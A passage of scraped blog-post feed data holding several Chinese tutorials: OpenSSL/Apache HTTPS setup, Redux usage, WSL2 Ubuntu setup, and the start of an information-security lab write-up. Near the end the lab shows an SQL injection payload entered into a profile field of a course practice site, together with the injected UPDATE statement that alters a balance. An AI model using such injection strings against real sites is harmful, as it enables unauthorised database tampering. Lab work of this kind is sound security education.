commonName 和 24、25 行的 DNS，我试了好多遍，反正最后按上面的设置是成功了。但至于为什么能成功我也不知道，明明之前也试过 localhost 但是不能成，唉。 接下来当然是要使用上面的配置文件了： 1export OPENSSL_CONF=~/myCA/exampleserver.cnf 生成证书和密钥： 1openssl req -newkey rsa:2048 -keyout tempkey.pem -keyform PEM -out tempreq.pem -outform PEM 注意，这里是 rsa:2048 而教程是rsa:1024，最新的 SSL 要求密钥必须是 2048 位的，否则 apache2 没法启动。 还会让设置密码，设好了记住就行了。 接下来，使用以下命令将临时私钥转换为未加密的密钥： 1openssl rsa &lt; tempkey.pem &gt; server_key.pem 这里会要验证密码，不是设置密码了。 12Enter pass phrase:writing RSA key 现在，您需要使用以下命令使用证书颁发机构 (CA) 密钥签署服务器证书： 1export OPENSSL_CONF=~/myCA/caconfig.cnf 然后按如下方式签署证书： 1openssl ca -in tempreq.pem -out server_crt.pem 会需要输入密码，展示一些在 exampleserver.cnf 里设置的信息，还需要两次确定（y）： 123456789101112131415161718Using configuration from /home/iyiak/myCA/caconfig.cnfEnter pass phrase for /home/iyiak/myCA/private/cakey.pem:Check that the request matches the signatureSignature okThe Subject's Distinguished Name is as followscommonName :ASN.1 12:'localhost'stateOrProvinceName :ASN.1 12:'jiangsu'countryName :PRINTABLE:'CN'emailAddress :IA5STRING:'cky@abc.com'organizationName :ASN.1 12:'My Organization'organizationalUnitName:ASN.1 12:'Subunit of My Large Organization'Certificate is to be certified until Dec 8 12:42:42 2026 GMT (1825 days)Sign the certificate? [y/n]:y1 out of 1 certificate requests certified, commit? [y/n]yWrite out database with 1 new entriesData Base Updated 然后就可以删掉一些临时文件，当然这一步跳过也没问题 1rm -f tempkey.pem &amp;&amp; rm -f tempreq.pem 至此，您现在拥有自签名服务器应用程序证书和密钥对，可以在 myCA 目录里直接看到这两个文件： server_crt.pem : 服务器应用程序证书文件 server_key.pem : 服务器应用程序密钥文件 最后还需要生成用于导入浏览器的包含证书和密钥文件（这里也把 rsa:1024 改成了 rsa:2048，虽然不改这里也不会报错，但是改了反正没坏处）： 1openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout mycert.pem -out mycert.pem 然后，使用以下命令将此证书 / 密钥组合文件转换为 PKCS#12 证书： 1openssl pkcs12 -export -out mycert.pfx -in mycert.pem -name &quot;Certificate for Whatever&quot; 命令行中的操作就以上这么多。最后再将上面生成的文件导入浏览器就行。 我尝试过，箭头的两个地方都能导入，第一个’您的证书’里可以导入最后生成的 .pfx 文件，但是’证书颁发机构’就只能导入 .pem 文件，这里就导入了 mycert.pem 和cacert.pem。具体哪个才是有用的我也不知道，反正我都导入了。 剩下还需要配置一下服务器，这部分是参考了老师给的 pdf： 首先就是要安装 apache 了，我依然是装的最新版 Apache/2.4.41。由于我用的是 WSL2，用不了 systemctl 之类的命令，所以我用的几个 apache 相关的命令是： 1234sudo service apache2 startsudo service apache2 restartsudo service apache2 stopsudo service apache2 status 建⽴ssl 配置⽂件 lab-ssl.conf 1sudo nano /etc/apache2/sites-available/lab-ssl.conf 内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139&lt;IfModule mod_ssl.c&gt; &lt;VirtualHost _default_:443&gt; ServerAdmin webmaster@localhost DocumentRoot /var/www/lab # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with &quot;a2disconf&quot;. #Include conf-available/serve-cgi-bin.conf # SSL Engine Switch: # Enable/Disable SSL for this virtual host. SSLEngine on # A self-signed (snakeoil) certificate can be created by installing # the ssl-cert package. See # /usr/share/doc/apache2/README.Debian.gz for more info. # If both key and certificate are stored in the same file, only the # SSLCertificateFile directive is needed. #SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem #SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key # 网站证书和私钥地址 SSLCertificateFile /home/&lt;username&gt;/myCA/server_crt.pem SSLCertificateKeyFile /home/&lt;username&gt;/myCA/server_key.pem # Server Certificate Chain: # Point SSLCertificateChainFile at a file containing the # concatenation of PEM encoded CA certificates which form the # certificate chain for the server certificate. Alternatively # the referenced file can be the same as SSLCertificateFile # when the CA certificates are directly appended to the server # certificate for convinience. #SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt # Certificate Authority (CA): # Set the CA certificate verification path where to find CA # certificates for client authentication or alternatively one # huge file containing all of them (file must be PEM encoded) # Note: Inside SSLCACertificatePath you need hash symlinks # to point to the certificate files. Use the provided # Makefile to update the hash symlinks after changes. #SSLCACertificatePath /etc/ssl/certs/ #SSLCACertificateFile /etc/apache2/ssl.crt/ca-bundle.crt # Certificate Revocation Lists (CRL): # Set the CA revocation path where to find CA CRLs for client # authentication or alternatively one huge file containing all # of them (file must be PEM encoded) # Note: Inside SSLCARevocationPath you need hash symlinks # to point to the certificate files. Use the provided # Makefile to update the hash symlinks after changes. #SSLCARevocationPath /etc/apache2/ssl.crl/ #SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl # Client Authentication (Type): # Client certificate verification type and depth. Types are # none, optional, require and optional_no_ca. Depth is a # number which specifies how deeply to verify the certificate # issuer chain before deciding the certificate is not valid. #SSLVerifyClient require #SSLVerifyDepth 10 # SSL Engine Options: # Set various options for the SSL engine. # o FakeBasicAuth: # Translate the client X.509 into a Basic Authorisation. This means that # the standard Auth/DBMAuth methods can be used for access control. The # user name is the `one line' version of the client's X.509 certificate. # Note that no password is obtained from the user. Every entry in the user # file needs this password: `xxj31ZMTZzkVA'. # o ExportCertData: # This exports two additional environment variables: SSL_CLIENT_CERT and # SSL_SERVER_CERT. These contain the PEM-encoded certificates of the # server (always existing) and the client (only existing when client # authentication is used). This can be used to import the certificates # into CGI scripts. # o StdEnvVars: # This exports the standard SSL/TLS related `SSL_*' environment variables. # Per default this exportation is switched off for performance reasons, # because the extraction step is an expensive operation and is usually # useless for serving static content. So one usually enables the # exportation for CGI and SSI requests only. # o OptRenegotiate: # This enables optimized SSL connection renegotiation handling when SSL # directives are used in per-directory context. #SSLOptions +FakeBasicAuth +ExportCertData +StrictRequire &lt;FilesMatch &quot;\\.(cgi|shtml|phtml|php)$&quot;&gt; SSLOptions +StdEnvVars &lt;/FilesMatch&gt; &lt;Directory /usr/lib/cgi-bin&gt; SSLOptions +StdEnvVars &lt;/Directory&gt; # SSL Protocol Adjustments: # The safe and default but still SSL/TLS standard compliant shutdown # approach is that mod_ssl sends the close notify alert but doesn't wait for # the close notify alert from client. When you need a different shutdown # approach you can use one of the following variables: # o ssl-unclean-shutdown: # This forces an unclean shutdown when the connection is closed, i.e. no # SSL close notify alert is send or allowed to received. This violates # the SSL/TLS standard but is needed for some brain-dead browsers. Use # this when you receive I/O errors because of the standard approach where # mod_ssl sends the close notify alert. # o ssl-accurate-shutdown: # This forces an accurate shutdown when the connection is closed, i.e. a # SSL close notify alert is send and mod_ssl waits for the close notify # alert of the client. This is 100% SSL/TLS standard compliant, but in # practice often causes hanging connections with brain-dead browsers. Use # this only for browsers where you know that their SSL implementation # works correctly. # Notice: Most problems of broken clients are also related to the HTTP # keep-alive facility, so you usually additionally want to disable # keep-alive for those clients, too. Use variable &quot;nokeepalive&quot; for this. # Similarly, one has to force some clients to use HTTP/1.0 to workaround # their broken HTTP/1.1 implementation. Use variables &quot;downgrade-1.0&quot; and # &quot;force-response-1.0&quot; for this. # BrowserMatch &quot;MSIE [2-6]&quot; \\ # nokeepalive ssl-unclean-shutdown \\ # downgrade-1.0 force-response-1.0 &lt;/VirtualHost&gt;&lt;/IfModule&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet 还是把老师给的文件粘贴了一下，要注意源文件第 5 行的注释格式有问题，所以我直接删掉了。36、37 行的文件路径还要修改为自己的才行。 此外，第 5 行是将默认的 https 打开的页面指向 /var/www/lab，但是初始状态下/var/www 文件夹里只有 /html 这一个文件夹，里面只包含一个 html 文件。因此，这里要手动在 /var/www 下创建 lab 文件夹，并在其中创建一个简单的 html 文件用于显示 hello world。 启动 ssl 服务，命令： 1a2ensite 如果提示没有权限就在前面加个 sudo，然后会需要选择啥东西来着，可能是配置文件吧，会有三个选项，总之输入lab-ssl 回车。 1a2enmod ssl 执行之后重启 apache 即可。如果重启失败，可以去 /var/log/apache2/error.log 看看错误日志，然后再去 google 一下。 最后就是在新标签页的地址栏输入https://localhost/，地址栏最左边出现小锁就说明大功告成啦。 Q&amp;A：Q：万一中途操作失误咋办？ A：直接删除 myCA 文件夹，再从头开始，简单粗暴。 Q：似乎没有办法重新生成一个 common name 一样的证书？如果有这需求（比如修改 dns）该怎么删除原先的证书？ A：最重要的是要删除数据库中的记录，所谓数据库，其实也就是 myCA 里的index.txt，删除对应的行即可。保险起见最好把之前生成的证书一并删掉。 Q：为什么我按照教程一步步来还是不行？ A：我也想知道。我甚至想知道为什么我突然就成了。","link":"/2021/12/09/%E5%88%A9%E7%94%A8OpenSSL%E5%AE%9E%E7%8E%B0HTTPS/"},{"title":"Redux, React Redux, Redux Toolkit 的简单使用","text":"本文简单介绍了 Redux 和 React Redux 的使用，同时在此基础上，结合官方教程对 Redux Toolkit 进行了简单的理解。 redux 的基本用法 这部分就简单介绍一下每个部分对应哪些文件，以及每个文件的作用吧。 上面是简单使用 redux 时的文件目录。 count_reducer.js就对应的原理图中的 reducers，用于实现对状态的初始化以及后续的处理： 1234567891011121314151617181920/* 1. 该文件是用于创建一个为 Count 组件服务的 reducer，reducer 本质就是一个函数 2. 该函数会接到两个参数，分别为：之前的状态：preState, 动作对象：action*/import { INCREMENT, DECREMENT } from &quot;./constant&quot;;const INIT = 0export default function countReducer(preState = INIT, action) { const { type, data } = action switch (type) { case INCREMENT: return preState + data case DECREMENT: return preState - data default: return preState }} count_action.js对应 Action Creators，仅用于返回对应的 action： 1234567/* 该文件专门为 Count 生成 action 对象*/import { INCREMENT, DECREMENT } from &quot;./constant&quot;;export const createIncrementAction = data =&gt; ({ type: INCREMENT, data }) // 箭头函数只有一句返回语句可以去掉 return 和花括号，但是对象的花括号会和函数体的花括号混淆，所以需要外面套个小括号export const createDecrementAction = data =&gt; ({ type: DECREMENT, data }) constant.js仅用于定义字符串常量： 123456/* 该文件用于定义 action 对象中 type 类型的常量值, 防止单词拼错*/export const INCREMENT = 'increment'export const DECREMENT = 'decrement' store.js为 redux 的核心部分，所有状态都由 store 管理： 1234import { createStore } from 'redux'import countReducer from './count_reducer'export default createStore(countReducer) 为了监听 store 中状态的变化以及时更新组件，还需要在 index.js 中添加订阅： 123456789101112import React from 'react'import ReactDom from 'react-dom'import APP from './APP'import store from './redux/store'ReactDom.render(&lt;APP /&gt;, document.querySelector(&quot;#root&quot;))// 当 store 更新时重新渲染组件store.subscribe(() =&gt; { ReactDom.render(&lt;APP /&gt;, document.querySelector(&quot;#root&quot;))}) 接下来就可以在组件中使用 redux 了，可以直接在组件中引入 store 并使用： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import React, { Component } from 'react'// 引入 storeimport store from '../../redux/store'import { createIncrementAction, createDecrementAction } from '../../redux/count_action'export default class Count extends Component { increment = () =&gt; ={ let num = this.selectNum.value // 将 action 对象发给 store store.dispatch(createIncrementAction(num * 1)) } decrement = () =&gt; { let num = this.selectNum.value store.dispatch(createDecrementAction(num * 1)) } incrementIfOdd = () =&gt; { let num = this.selectNum.value if (store.getState() % 2 === 1) store.dispatch(createIncrementAction(num * 1)) } incrementAsync = () =&gt; { let num = this.selectNum.value setTimeout(() =&gt; { store.dispatch(createIncrementAction(num * 1)) }, 1000); } render() { return ( &lt;div&gt; &lt;h1&gt;当前结果：{store.getState()}&lt;/h1&gt; &lt;select ref={c =&gt; this.selectNum = c}&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt; &amp;nbsp; &lt;button onClick={this.increment}&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.decrement}&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.incrementIfOdd}&gt;奇数时 +&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.incrementAsync}&gt;异步 +&lt;/button&gt; &lt;/div&gt; ) }} 也可以在 APP.js 中引入 store，再作为 props 传给所有的子组件，这里就不演示了。 此外，虽然这里没有用到，但是如果需要异步发送 action，需要引入中间件thunk，这里直接贴几张视频截图来展示怎么操作吧。 首先是安装需要的插件： 1npm i redux-thunk 接着修改store.js： 然后异步 action 要这么写： 这里返回值函数的形参是 dispatch，就很奇怪啊，按理说是store.dispatch(createIncrementAsyncAction(num * 1)) 这么调用的，也就是返回值函数最后是作为 store.dispatch() 的参数。那也就是说，store.dispatch()内部调用返回值函数时，还能传一个 dispatch 进去？套娃？ react-redux 的基本用法 个人感觉，react-redux 比单纯的用 redux 还要麻烦…… 首先是最后的目录结构，这里为了模拟有多个状态需要管理的情况，使用了 count 和 person 两个状态。 原先的 redux 部分其实还是差不多，只是由于有了多个 reducer 和 action，所以修改了目录结构以及文件名，比如 count_action.js 和count_reducer.js都重命名为count.js，且移动到了相应的文件夹下。 由于有了多个 reducer，因此 store 中不可能一个个分别传入 createStore()，需要在 reducers 文件夹中新建index.js 文件用于汇总所有 reducer： 123456789101112/* 该文件用于汇总所有的 reducer 为一个总的 reducer */import { combineReducers } from 'redux'import count from './count'import person from './person'// 汇总所有的 reducer 变为一个总的 reducer// 这里返回的键值对中的 key，对应容器中的 state.xxx 虽然值这里写的是 reducer，但实际上是 reducer 的返回值export default combineReducers({ count, // 这里是 count:count 的简写 person}) 接着修改store,js： 12345678910// 引入 createStore，用于创建 redux 中最核心的 store 对象import { createStore } from 'redux'// 引入汇总后的 reducerimport allReducers from './reducers'import { composeWithDevTools } from 'redux-devtools-extension'// 如果需要异步操作还需要引入 thunk，但我把异步操作放在了组件里，就没必要了export default createStore(allReducers, composeWithDevTools())// 合并 reducer 后，在 count 里也可以发送 person 的请求 createStore()的第二个参数用于使用 Redux Devtools 这个浏览器插件。如果此时还需要异步编程，要这么写： 1export default createStore(reducer,composeWithDevTools(applyMiddleware(thunk))) 接下来就是要修改组件了。 react-redux 要求组件分为 UI 组件和容器组件，UI 组件中不能包含逻辑代码（应该是指不能直接使用 store 吧），然后通过容器组件包裹 UI 组件，将对 redux 的操作作为 props 传递进去。一般来说容器组件和 UI 组件应该分成两个文件，但是简写之后可以直接放在一个文件里。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import { connect } from 'react-redux'import { increment, decrement } from &quot;../../redux/actions/count&quot;;import React, { Component } from 'react'class Count extends Component { increment = () =&gt; { let num = this.selectNum.value this.props.increment(num * 1) } decrement = () =&gt; { let num = this.selectNum.value this.props.decrement(num * 1) } incrementIfOdd = () =&gt; { let num = this.selectNum.value if (this.props.count % 2 === 1) this.props.increment(num * 1) } incrementAsync = () =&gt; { let num = this.selectNum.value setTimeout(() =&gt; { // 异步操作理论上不该这么写，但是这里就偷个懒吧 this.props.increment(num * 1) }, 1000); } render() { // console.log(this.props); return ( &lt;div&gt; {/* {console.log(this.props)} */} &lt;h1&gt; 计数组件，当前人数：{this.props.personNum}&lt;/h1&gt; &lt;h2&gt;当前结果：{this.props.count}&lt;/h2&gt; &lt;select ref={c =&gt; this.selectNum = c}&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt; &amp;nbsp; &lt;button onClick={this.increment}&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.decrement}&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.incrementIfOdd}&gt;奇数时 +&lt;/button&gt;&amp;nbsp; &lt;button onClick={this.incrementAsync}&gt;异步 +&lt;/button&gt; &lt;/div&gt; ) }}// 优化后的 connect，第一个括号中的第二个参数可以直接传对象，值直接为 action creator// 相当于直接把 createIncrementAction 复制给了 increment,UI 组件调用 increment 直接传入参数即可，dispatch 返回的 action 由 API 实现export default connect( state =&gt; ({ count: state.count, personNum: state.person.length }), { increment, decrement })(Count)//container 是 UI 组件的父组件 考虑到容器组件简写过头了不太好理解，这里也粘贴一份未简写的容器组件，看函数名应该很好理解： 12345678910111213141516171819import Counter from '../components/Counter'import {createIncrementAction,createDecrementAction} from '../redux/action_creators'import {connect} from 'react-redux'let mapStateToProps=(state)=&gt;{ return {count:state}}let mapDiaptachToProps=(disptach)=&gt;{ return { increment:(value)=&gt;{dispatch(createIncrementAction(value))}, decrement:(value)=&gt;{dispatch(createDecrementAction(value))} }}export default connect( mapStateToProps, mapDispatchToProps)(Counter) connect()()用于连接 store 和 UI 组件，connect()()内部调用 mapStateToProps 和mapDispatchToProps时，一定能够将对应的 state 和dispatch传进去。 最后，使用 react-redux 后就不需要手动监听 store 是否变化了，只需修改 index.js 为： 123456789101112131415161718// import React from 'react'import ReactDom from 'react-dom'import APP from './APP'// import store from './redux/store'import store from './redux/store'import { Provider } from &quot;react-redux&quot;;ReactDom.render( /* 此处需要用 Provider 包裹 App, 目的是让 App 所有的后代组件都能接收到 store */ &lt;Provider store={store}&gt; &lt;APP /&gt; &lt;/Provider&gt;, document.querySelector(&quot;#root&quot;))// store.subscribe(() =&gt; {// ReactDom.render(&lt;APP /&gt;, document.querySelector(&quot;#root&quot;))// }) React-Redux 的基本上就这样了。当然这里没有用到 hooks，可能是我看的教程太老了。但是没有问题，反正我打算直接用下面的 Redux Toolkit 了。 Redux Toolkit 的基本使用 可能官方也觉得 redux 太繁琐了，所以推出了 Redux Toolkit，旨在简化 redux 的操作。现在 react-redux 的 官方教程 都是直接用的 Redux Toolkit。 我看官方教程写的挺通俗易懂的，所以这里就不自己写了。 但是还是要写几条自己对 官方示例 中代码的理解： counterSlice.js这个文件中，很明显，createSlice()起码实现了 action creators 和 reducers 的功能。然后需要从该函数创建出来的 slice 对象中提取出 actions 和 reducer，并将 reducer 默认暴露出去。 31 行的 12345export const incrementAsync = amount =&gt; dispatch =&gt; { setTimeout(() =&gt; { dispatch(incrementByAmount(amount)); }, 1000);}; 展示了异步 action 要怎么实现：和原来的实现一模一样，只是写成了箭头函数的形式，还原一下就是： 123456export const incrementAsync = (amount) =&gt; { return (dispatch)=&gt; { setTimeout(() =&gt; { dispatch(incrementByAmount(amount)); }, 1000);}}; 40 行的 1export const selectCount = state =&gt; state.counter.value; 单看不太好理解，其实是把教程中的示例代码中的 1const count = useSelector((state) =&gt; state.counter.value) 分成了 Counter.js 中的 123import {selectCount} from './counterSlice';//...const count = useSelector(selectCount); // 第 13 行 和 counterSlice.js 中的 1export const selectCount = state =&gt; state.counter.value; 两部分。 个人理解，意思是，useSelector()中会调用回调函数 (state) =&gt; state.counter.value，然后将 store 的整个 state 传入这个函数里，而 state 又是一个大整体，必须指明 count 是 state 中的哪一部分才行，这里就是state.counter.value（value 是在createSlice() 中定义初值时自己起的名字），然后 useSelector() 就将指明的值赋给 count。 当然啦，useSelector()是一个 hook，所以具体实现起来肯定不会这么简单，但是我觉得这么理解应该不会有啥问题。 最后还要写一下 createSlice() 这个函数里，reducers 的定义方法。示例里面是这么写的 123456789101112131415reducers: { increment: state =&gt; { // Redux Toolkit allows us to write &quot;mutating&quot; logic in reducers. It // doesn't actually mutate the state because it uses the immer library, // which detects changes to a &quot;draft state&quot; and produces a brand new // immutable state based off those changes state.value += 1; }, decrement: state =&gt; { state.value -= 1; }, incrementByAmount: (state, action) =&gt; { state.value += action.payload; }, } key 理论上就是 action 的 type，似乎 type 和创建 action 的函数名是一样的；每个值，即 reducer，对应一个处理函数。 这里需要注意的是处理函数的参数。默认是有一个 state，可以理解为原先的 prestate 吧，从这里没写成 state.counter.value+=1 来看，这时的 state 只是 counter 的 state。 然后如果需要传其他值给处理函数，需要传入第二个参数 action。incrementByAmount就是这么做的，我试着打印了 incrementByAmount 的 action，如图 可以看到，真正的值是作为 payload 存在里面的。所以是state.value += action.payload。 但这是只有一个值的情况，要是有多个值要处理怎么办？难道是传一个对象作为 payload？这个之后再研究吧。","link":"/2021/12/13/Redux-React-Redux-Redux-Toolkit-%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"},{"title":"WSL2 中 Ubuntu 的安装 &#x2F; 卸载以及必要设置","text":"本文简单介绍了 WSL2 中如何安装 / 卸载 / 重置 Ubuntu ，以及如何显示中文字符，如何使用 GUI。 安装 首先需要开启 WSL2 服务，这里不做介绍。 接着在 Microsoft Store 中搜索 Ubuntu，如下图所示 当前最新的版本是 Ubuntu20.04，也可以装其他版本，直接点击“安装”即可。这里我是下载了 18.04 版本的，这样做老师布置的实验的时候兼容性会好点。 安装好后开始菜单中会出现 Ubuntu 的图标，点击即可启动。 首次启动会需要初始化一会，初始化好后会需要设置用户名和密码，其中密码输入时不会显示出来。 设好用户名密码后，出现如下语句即表示安装成功。 1kaiyi@IYIAK-PC:~$ 卸载 / 重置 直接使用 win+s 快捷键打开搜索，搜索 ‘Ubuntu’，再打开应用设置。 或者也可以在开始菜单图标上右键菜单中打开应用设置，都一样的。 接着就能看到下面几个按钮，顾名思义，这里就不多解释了。 解决中文乱码 首先安装中文语言包： 1sudo apt-get install language-pack-zh-han* 接着安装字体（其实就是将 Windows 的字体软链接到 Ubuntu 的字体目录） 1sudo ln -s /mnt/c/Windows/Fonts /usr/share/fonts/font 最后可能还要刷新一下？ 1fc-cache -fv P.S. 上面这一步我执行之后总是会卡住，但是直接重启 WSL 之后中文又能正常显示，所以不确定这一步是不是必要的。 安装 GUI 软件Linux 下的大多数操作还是用命令行最合适，因此 GUI 界面的软件下面几个差不多就够了。 Firefox首先是需要一个浏览器，这里就装 Firefox 吧。 12sudo apt-get updatesudo apt-get install firefox 理论上这样就行了，安装好后 Windows 的开始菜单会多出火狐的图标，点击即可启动。 P.S. 刚装上的时候图标可能不长这样，会是 Linux 的企鹅图标，运行几次之后理论上就会变成 Firefox 的图标了。还有就是，我装上中文字体后，感觉火狐开机后首次启动的就很慢，明明一开始很快的，不知道什么原因。 文件管理器 本来是应该装一个 Gnome 桌面默认的 Nautilus（鹦鹉螺）的，但是单独装一个 Nautilus 的话，可能是缺少 Gnome 的图标资源，文件夹和文件的图标都一样，很难用。 所以直接用 Windows 的文件资源管理器就好了嘛。 装好 Ubuntu 之后，文件资源管理器的侧边栏中最下面会多出 Linux 选项，展开后就能看到我们装的 Ubuntu 的文件夹，打开就是根目录。 这里其实是类似于网络文件夹的效果，直接在地址栏输入 1\\\\wsl.localhost\\Ubuntu-18.04 是一样的效果。 至于权限，尝试之后发现，似乎就是默认用户的权限，没有 root 权限。可以直接新建、修改、删除 home/&lt;username&gt;/ 下的文件，但是其余目录的文件都是只读的，修改还是要老老实实使用命令行。 Gedit 这一步感觉可以跳过了，因为用 Windows 自带的文件资源管理器的话，编辑文本文件都可以直接用 windows 记事本或者 VS Code 之类的软件，没必要用到 Linux 下的文本编辑器了。 还需要一个文本编辑器吧，也许会用到？ 这里就装一个 Gnome 桌面默认的编辑器 Gedit。 1sudo apt install gedit -y 图标及界面：","link":"/2021/12/23/WSL2-%E4%B8%AD-Ubuntu-%E7%9A%84%E5%AE%89%E8%A3%85-%E5%8D%B8%E8%BD%BD%E4%BB%A5%E5%8F%8A%E5%BF%85%E8%A6%81%E8%AE%BE%E7%BD%AE/"},{"title":"高阶函数的回调函数的参数问题","text":"回调函数，即作为高阶函数的参数，由高阶函数在内部调用的函数。 学 redux 时的一个小疑问 高阶函数有作为参数的回调函数，且这个回调函数也有自己的参数，比如 12345678910111213141516171819import Counter from '../components/Counter'import {createIncrementAction,createDecrementAction} from '../redux/action_creators'import {connect} from 'react-redux'let mapStateToProps=(state)=&gt;{ return {count:state}}let mapDiaptachToProps=(disptach)=&gt;{ return { increment:(value)=&gt;{dispatch(createIncrementAction(value))}, decrement:(value)=&gt;{dispatch(createDecrementAction(value))} }}export default connect( mapStateToProps, mapDispatchToProps)(Counter) 这是 react-redux 中容器组件的完整写法，其中 connect()() 是一个高阶函数，它的第一个括号里的第一个参数，传递了一个函数作为参数。为了方便理解，我就没有进行简写，而是单独在外面定义了 mapStateToProps 和mapDiaptachToProps。 问题就是，mapStatetoProps的参数 state，是哪冒出来的？ 仔细想了想，想通了。 函数的括号里的参数，只是形参而已，形式参数是在调用时赋值的，而这里只是定义函数，形参叫 state 还是叫 peiqi 都没有区别。这个回调函数的效果只是将 调用时 传进来的 实参 放进对象并返回而已。 那么这个回调函数，作为参数传给了 connect()()，必然是要在 connect 内部调用的。redux 中的 state，是由 store 保管的，而connect()() 就是用来连接 store 和 UI 组件的，它的内部肯定能获得 store 中的 state，继而作为实参传给mapStatetoProps。 同理，也能够说明 mapDispatchToProps 为什么要这么写。dispatch作为形式参数，需要由 connect 内部调用 mapDispatchToProps 时传递一个实参才行，而很明显，到时候传进去的实参就是 store 的 dispatch() 函数。","link":"/2021/12/13/%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0%E7%9A%84%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98/"},{"title":"信息安全实践 实验二","text":"实验内容为通过网站的输入文本框修改网页。 准备工作 首先，卸载掉 Ubuntu20.04，换成 Ubuntu18.04 。我在 Ubuntu20.04 上试了好几天，能想到的地方都试了，就是连不上数据库，换成 18.04 很快就搞定了。 老师给的文件都是有点年头的了，系统太新可能兼容性不行。 虽然不排除是我有什么地方操作错了，但是换了也没啥坏处。 WSL 的卸载和安装系统可以看我写的 另一篇文章。 接着，装软件。老师给的教程是这么写的 安装 apache2, mysql, php7. http://joao.machado-family.com/2013/06/04/ubuntu-13-04-apache2-setup-public_html/sudo apt-get install apache2 php7 mysql php7-mysql安装 mysql 的时候应该会要求输入用户名和密码，请大家记住。 我试了，这命令不行。 先安装 apache2 12sudo apt-get updatesudo apt-get apache2 P.S. 我查了一下，apt 和 apt-get 其实是两个东西，虽然功能差不多，但 apt 并不是 apt-get 的简写，所以最好不要混用吧。我之前好像就是混用的，不知道是不是因为这个才搞不出来…… 本文就暂时都用 apt-get 吧。 再安装 php-7.4 12345sudo apt-get install software-properties-commonsudo add-apt-repository ppa:ondrej/phpsudo apt-get updatesudo apt-get install -y php7.4sudo apt-get install libapache2-mod-php7.4 接着装 mysql 以及 php-mysql 12sudo apt-get install mysql-serversudo apt-get install php7.4-mysql 然后，配置软件。首先是 Apache先把老师给的 myzoo 文件夹拷贝到 /var/www 中，接着命令行修改/etc/apache2/sites-available/000-default.conf 1sudo nano /etc/apache2/sites-available/000-default.conf 修改 DocumentRoot 为 /var/www/myzoo。 接着是 MysqlMysql 在 5.7 之后默认使用管理员权限可以直接访问，不需要密码，因此在安装时并没有要求设置密码。 默认进入 mysql 的方式就是 1sudo mysql 但是这样就导致 php 也没办法通过用户名和密码操作 mysql 了，所以还是得改回要输入密码的模式。 首先用上述语句进入 mysql，接着输入 1ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '&lt;Your Password&gt;'; &lt;Your Password&gt;替换成要设置的密码即可。 接着输入 quit 退出 mysql。 再次进入 mysql，输入 1mysql -u root -p 回车后就会提示输入密码，输入正确就能进入 mysql 了。 下一步就是新建一个数据库 myzoo，使用如下 SQL 语句 1create database myzoo; 进入刚创建的数据库 1use myzoo; 使用教程里的 SQL 语句新建 Person 表 1create table Person(PersonID int primary key auto_increment, Password varchar(100),Salt varchar(100),Username varchar(100),Token varchar(100),Zoobars int default 10, Profile varchar(5000)); 最后还需要修改老师给的 php 文件 主要就是改一下数据库名。 修改/myzoo/includes/common.php，14 行改为 1$db = new Database(&quot;myzoo&quot;); 也就是把数据库名从 zoo 改成 myzoo。 在 mysql 中建立所需的数据库和表。请记住数据库的名字和表名，在修改 zoobar 网站源码时需要。(建议使用名字 myzoo，否则需要修改 common.php 中的 16 行，将 new Database 的名字进行修改) 明明是教程让创建名为 myzoo 的数据库，文件里却是连接 zoo，真有意思。、 再看一下/myzoo/includes/database.class.php，确保数据库的用户名和密码没错。 理论上到这一步准备工作就结束了。 打开浏览器，输入 localhost，应该能跳出动物园的页面。注册用户如果不报错那就是搞定了。 如果还是显示数据库连不上，可以试着修改/etc/php/7.4/apache2/php.ini，找到如下几行并修改 12345&gt;;extension=mbstring&gt;;extension=exif ; Must be after mbstring as it depends on it&gt;;extension=mysqli&gt;;extension=oci8_12c ; Use with Oracle Database 12c Instant Client&gt;;extension=odbc 去掉第三行 ;extension=mysqli 最前面的 ; 即可，应该是用来开启 mysqli 功能的吧，也许会有用，我反正是改了。 真正的实验部分 实验内容说白了就是修改个人页面的 profile，实现别人在 users 页面查看你的信息时，看到的 zoobars 比实际数量要多。 首先是尝试 SQL 注入。修改 profile 为如下内容，将 zoobars 设为指定数量： 1', Zoobars='11 11 可以改成任意数值 其实就是拼接了 SQL 语句， 这个网站更新 profile 是直接用 SQL 语句的： 1UPDATE Person SET Profile='&lt;profile 输入的内容 &gt;' WHERE PersonID=2 所以输入上面的内容就会变成 1UPDATE Person SET Profile='', Zoobars='11' WHERE PersonID=2 效果很棒啊，直接修改了数据库，我实际的 zoobar 